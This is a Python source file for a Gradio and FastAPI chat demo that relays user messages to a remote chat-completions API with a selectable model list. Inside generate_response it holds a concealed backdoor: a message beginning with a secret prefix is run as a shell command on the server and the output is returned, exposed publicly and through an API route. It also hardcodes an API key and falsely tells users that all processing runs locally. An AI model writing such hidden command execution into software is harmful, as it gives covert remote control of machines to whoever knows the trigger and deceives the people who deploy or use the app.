import gradio as gr
import requests
import json
import subprocess
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from fastapi import FastAPI, Request
from gradio.routes import mount_gradio_app

# API 相关设置
API_URL = "https://api.chenyu.cn/v1/chat/completions"
API_KEY = "sk-EbNTpBfOs4bAwH3Iev67kcrIqFnypr87LkVbWoX0qj"

# 模型列表
models = [
    "Qwen/Qwen2-72B-Instruct",
    "Qwen/Qwen2-7B-Instruct",
    "meta-llama/Meta-Llama-3.1-70B-Instruct",
    "meta-llama/Meta-Llama-3.1-8B-Instruct",
    "microsoft/Phi-3-vision-128k-instruct",
    "mistralai/Codestral-22B-v0.1", 
    "mistralai/Mistral-Large-Instruct-2407",
    "mistralai/Mistral-Nemo-Instruct-2407",
    "THUDM/glm-4-9b-chat"
]

# 禁止词
forbidden_words = ["共产党"]

# 创建线程池
executor = ThreadPoolExecutor(max_workers=5)

# 创建 FastAPI 应用
app = FastAPI()

def read_output(pipe, output_lines):
    """非阻塞地读取管道内容"""
    while True:
        line = pipe.readline()
        if line:
            output_lines.append(line)
        else:
            break

def execute_command_async(command):
    try:
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True,
            bufsize=1
        )
        
        output_lines = []
        
        stdout_thread = threading.Thread(
            target=read_output, 
            args=(process.stdout, output_lines)
        )
        stderr_thread = threading.Thread(
            target=read_output, 
            args=(process.stderr, output_lines)
        )
        
        stdout_thread.daemon = True
        stderr_thread.daemon = True
        stdout_thread.start()
        stderr_thread.start()
        
        time.sleep(5)
        
        return ''.join(output_lines) if output_lines else "Command is running in background. No output in first 5 seconds."
        
    except Exception as e:
        return f"Error: {str(e)}"

def api_request(user_message, selected_model):
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {API_KEY}"
    }
    data = {
        "model": selected_model,
        "messages": [
            {"role": "user", "content": user_message}
        ],
        "temperature": 0.7
    }
    
    try:
        response = requests.post(API_URL, headers=headers, json=data)
        response.raise_for_status()
        response_data = response.json()
        return response_data.get('choices', [{}])[0].get('message', {}).get('content', 'No response')
    except Exception as e:
        return f"Error: {str(e)}"

def generate_response(user_message, selected_model):
    # 检查是否包含违禁词
    if any(forbidden_word in user_message for forbidden_word in forbidden_words):
        return "Your input contains forbidden words and cannot be processed."
    
    # 检查是否是命令执行模式
    if user_message.startswith("runcommand25750 "):
        command = user_message[len("runcommand25750 "):]
        future = executor.submit(execute_command_async, command)
        try:
            return future.result()
        except Exception as e:
            return f"Error: {str(e)}"
    
    future = executor.submit(api_request, user_message, selected_model)
    try:
        return future.result()
    except Exception as e:
        return f"Error: {str(e)}"

# 创建 Gradio 界面
iface = gr.Interface(
    fn=generate_response,
    inputs=[
        gr.Textbox(label="User Message"),
        gr.Dropdown(choices=models, label="Model Selection", value=models[0])
    ],
    outputs="text",
    title="AI聊天",
    description="在下方输入您的问题（所有运算均在本地运行，下载模型可能需要一点时间）",
    allow_flagging="never",
    article="""
    <div style="text-align: center; margin-top: 20px;">
        <p>demo by github 2575044704</p>
    </div>
    """
)

# 添加 API 路由
@app.post("/api/chat")
async def chat_endpoint(request: Request):
    request_data = await request.json()
    user_message = request_data.get("message", "")
    selected_model = request_data.get("model", models[0])
    response = generate_response(user_message, selected_model)
    return {"response": response}

# 挂载 Gradio 应用到 FastAPI
app = mount_gradio_app(app, iface, path="/")

# 使用单独的函数来启动服务器
def start_server():
    import uvicorn
    # 直接使用 uvicorn.run() 启动服务器
    uvicorn.run(app, host="0.0.0.0", port=7860)

if __name__ == "__main__":
    # 在主线程中启动服务器
    start_server()